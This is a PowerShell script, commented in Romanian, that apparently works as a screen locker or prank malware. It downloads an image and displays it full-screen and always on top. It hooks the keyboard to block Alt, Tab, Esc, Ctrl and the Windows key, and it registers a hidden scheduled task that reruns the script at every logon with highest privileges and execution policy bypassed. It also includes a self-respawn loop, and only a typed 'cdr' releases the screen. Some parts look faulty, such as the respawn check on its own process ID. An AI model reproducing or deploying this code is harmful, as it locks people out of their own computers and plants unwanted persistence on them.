# Configurare URL pentru imagine
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\cdr.png"

# Funcție de descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Funcție pentru afișarea imaginii pe tot ecranul
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true

    try {
        $img = [System.Drawing.Image]::FromFile($tempImagePath)
    } catch {
        Write-Host "Eroare la încărcarea imaginii. Verificați descărcarea." -ForegroundColor Red
        exit
    }

    $pictureBox = New-Object System.Windows.Forms.PictureBox
    $pictureBox.Image = $img
    $pictureBox.Dock = 'Fill'
    $pictureBox.SizeMode = 'StretchImage'
    $form.Controls.Add($pictureBox)

    $global:keySequence = ""
    $form.KeyDown += {
        param($sender, $eventArgs)
        $global:keySequence += $eventArgs.KeyChar
        if ($global:keySequence -like "*cdr") {
            Stop-All
        }
    }

    $form.ShowDialog()
}

# Blochează tastele critice
function Block-Keys {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class InterceptKeys {
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;
        public const int WM_SYSKEYDOWN = 0x0104;
    }
"@

    $global:hookId = [InterceptKeys]::SetWindowsHookEx(
        [InterceptKeys]::WH_KEYBOARD_LL,
        {
            param($nCode, $wParam, $lParam)
            if ($nCode -ge 0 -and ($wParam -eq [InterceptKeys]::WM_KEYDOWN -or $wParam -eq [InterceptKeys]::WM_SYSKEYDOWN)) {
                $key = [System.Runtime.InteropServices.Marshal]::ReadInt32($lParam)
                # Blochează tastele critice
                if ($key -in 9, 18, 27, 91, 17) {
                    return [IntPtr]::Zero
                }
            }
            return [InterceptKeys]::CallNextHookEx($null, $nCode, $wParam, $lParam)
        },
        [IntPtr]::Zero,
        0
    )
}

# Oprește complet toate instanțele scriptului
function Stop-All {
    Get-Process powershell -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_ -and $_.MainWindowTitle -eq "PowerShell") {
            Stop-Process -Id $_.Id -Force
        }
    }
    schtasks /delete /tn "PersistentImageViewer" /f | Out-Null
    exit
}

# Persistență prin Task Scheduler
function Set-Startup {
    $taskName = "PersistentImageViewer"
    $scriptPath = $MyInvocation.MyCommand.Path
    schtasks /create /tn $taskName /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File '$scriptPath'" /sc onlogon /rl highest /f | Out-Null
}

# Monitorizare persistentă
function Monitor-Process {
    while ($true) {
        if (-not (Get-Process -Id $pid -ErrorAction SilentlyContinue)) {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$MyInvocation.MyCommand.Path'" -WindowStyle Hidden
            exit
        }
        Start-Sleep -Seconds 1
    }
}

# Executare funcționalități
Download-Image
Set-Startup
Start-Job -ScriptBlock { Monitor-Process }
Start-Job -ScriptBlock { Block-Keys }
Show-FullScreenImage
